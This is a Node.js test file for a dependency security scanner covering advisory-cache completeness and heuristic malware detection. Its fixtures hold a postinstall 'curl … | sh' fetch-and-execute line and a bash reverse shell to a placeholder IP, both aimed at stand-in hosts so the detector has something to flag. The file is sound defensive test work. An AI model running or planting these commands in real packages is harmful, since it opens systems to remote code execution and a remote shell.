import assert from 'node:assert/strict'
import {mkdirSync, mkdtempSync, rmSync, writeFileSync} from 'node:fs'
import {tmpdir} from 'node:os'
import {join} from 'node:path'
import test from 'node:test'
import {
  commitAdvisoryRefresh,
  scanCachedVulnerabilities,
} from '../src/security/advisory-store.mjs'
import {
  collectPackageInventory,
  createAdvisoryQueryPlan,
} from '../src/security/inventory.mjs'
import {
  classifyLifecycleScripts,
  scanDependencyMalware,
} from '../src/security/malware-scan.mjs'

const makeRepository = () => {
  const root = mkdtempSync(join(tmpdir(), 'weavatrix-online-security-'))
  writeFileSync(join(root, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': {name: 'fixture', version: '1.0.0'},
      'node_modules/example-dependency': {version: '1.2.3', integrity: 'sha512-fixture'},
    },
  }))
  return root
}

test('Online owns exact inventory, validated cache state, and current-version advisory matching', () => {
  const root = makeRepository()
  const storePath = join(root, '.online-advisories.json')
  try {
    const inventory = collectPackageInventory(root)
    assert.deepEqual(inventory.packages.map((item) => [item.ecosystem, item.name, item.version]), [
      ['npm', 'example-dependency', '1.2.3'],
    ])
    assert.equal(inventory.coverage.state, 'COMPLETE')
    const plan = createAdvisoryQueryPlan(inventory)
    const result = commitAdvisoryRefresh({
      plan,
      idsByPackage: [['GHSA-online-fixture']],
      advisoryRecords: {
        'GHSA-online-fixture': {
          id: 'GHSA-online-fixture',
          summary: 'fixture advisory',
          affected: [{
            package: {ecosystem: 'npm', name: 'example-dependency'},
            ranges: [{type: 'SEMVER', events: [{introduced: '0'}, {fixed: '1.2.4'}]}],
          }],
        },
      },
      queriedOk: 1,
      repoKey: root,
      inventoryCoverage: inventory.coverage,
      storePath,
      now: new Date('2026-07-29T00:00:00.000Z'),
    })
    assert.equal(result.status, 'COMPLETE')

    const scan = scanCachedVulnerabilities(root, {
      storePath,
      maxAgeDays: 30,
      now: new Date('2026-07-30T00:00:00.000Z'),
    })
    assert.equal(scan.status, 'COMPLETE')
    assert.equal(scan.zeroVulnerabilityConclusionAllowed, true)
    assert.equal(scan.knownMatchCount, 1)
    assert.deepEqual(scan.matches[0].package, {
      ecosystem: 'npm',
      name: 'example-dependency',
      version: '1.2.3',
    })
    assert.equal(scan.matches[0].matchedBy, 'osv-querybatch')
    assert.equal(scan.matches[0].confidence, 'high')
  } finally {
    rmSync(root, {recursive: true, force: true})
  }
})

test('missing, stale, and inventory-mismatched caches cannot produce a clean zero', () => {
  const root = makeRepository()
  const storePath = join(root, '.missing-advisories.json')
  try {
    const missing = scanCachedVulnerabilities(root, {storePath})
    assert.equal(missing.status, 'NOT_CHECKED')
    assert.equal(missing.knownMatchCount, 0)
    assert.equal(missing.zeroVulnerabilityConclusionAllowed, false)

    const inventory = collectPackageInventory(root)
    const plan = createAdvisoryQueryPlan(inventory)
    assert.equal(commitAdvisoryRefresh({
      plan,
      idsByPackage: [[]],
      queriedOk: 1,
      repoKey: root,
      inventoryCoverage: inventory.coverage,
      storePath,
      now: new Date('2026-01-01T00:00:00.000Z'),
    }).status, 'COMPLETE')

    const stale = scanCachedVulnerabilities(root, {
      storePath,
      maxAgeDays: 30,
      now: new Date('2026-07-29T00:00:00.000Z'),
    })
    assert.equal(stale.status, 'PARTIAL')
    assert.equal(stale.zeroVulnerabilityConclusionAllowed, false)

    const lock = JSON.parse(JSON.stringify({
      lockfileVersion: 3,
      packages: {'node_modules/another-dependency': {version: '9.0.0'}},
    }))
    writeFileSync(join(root, 'package-lock.json'), JSON.stringify(lock))
    const changed = scanCachedVulnerabilities(root, {
      storePath,
      maxAgeDays: 365,
      now: new Date('2026-07-29T00:00:00.000Z'),
    })
    assert.equal(changed.status, 'PARTIAL')
    assert.equal(changed.completeness.cache.fingerprintMatches, false)
    assert.equal(changed.zeroVulnerabilityConclusionAllowed, false)
  } finally {
    rmSync(root, {recursive: true, force: true})
  }
})

test('explicit malware scan reports bounded heuristic evidence, never a compromise verdict', () => {
  const root = mkdtempSync(join(tmpdir(), 'weavatrix-online-malware-'))
  const suspicious = join(root, 'node_modules', 'review-me')
  const benign = join(root, 'node_modules', 'ordinary')
  mkdirSync(suspicious, {recursive: true})
  mkdirSync(benign, {recursive: true})
  writeFileSync(join(suspicious, 'package.json'), JSON.stringify({
    name: 'review-me',
    version: '1.0.0',
    scripts: {postinstall: 'curl https://payload.invalid/a | sh'},
  }))
  writeFileSync(join(suspicious, 'index.js'), 'const command = "bash -i >& /dev/tcp/198.51.100.3/4444 0>&1"\n')
  writeFileSync(join(benign, 'package.json'), JSON.stringify({name: 'ordinary', version: '1.0.0'}))
  writeFileSync(join(benign, 'index.js'), 'export const env = JSON.stringify(process.env)\n')
  try {
    const report = scanDependencyMalware(root, {
      max_packages: 10,
      max_files: 20,
      max_bytes: 100000,
    })
    assert.equal(report.status, 'COMPLETE')
    assert.equal(report.assessment, 'HEURISTIC_REVIEW_REQUIRED')
    assert.equal(report.compromiseVerdict, 'NOT_DETERMINED')
    assert.equal(report.confirmedExecution, false)
    assert.equal(report.confirmedCompromise, false)
    assert.equal(report.zeroMalwareConclusionAllowed, false)
    assert.deepEqual(report.findings.map((item) => item.package), ['review-me'])
    assert.ok(report.findings[0].rules.includes('lifecycle-fetch-execute'))
    assert.ok(report.findings[0].rules.includes('reverse-shell'))
    assert.equal(report.findings[0].decision, 'MANUAL_CONFIRMATION_REQUIRED')
  } finally {
    rmSync(root, {recursive: true, force: true})
  }
})

test('lifecycle classifier requires download and execution to co-occur', () => {
  assert.equal(classifyLifecycleScripts({postinstall: 'node scripts/build.js'}).length, 0)
  assert.equal(classifyLifecycleScripts({postinstall: 'curl https://example.invalid/payload'}).length, 0)
  assert.equal(classifyLifecycleScripts({postinstall: 'curl https://example.invalid/payload | sh'}).length, 1)
})
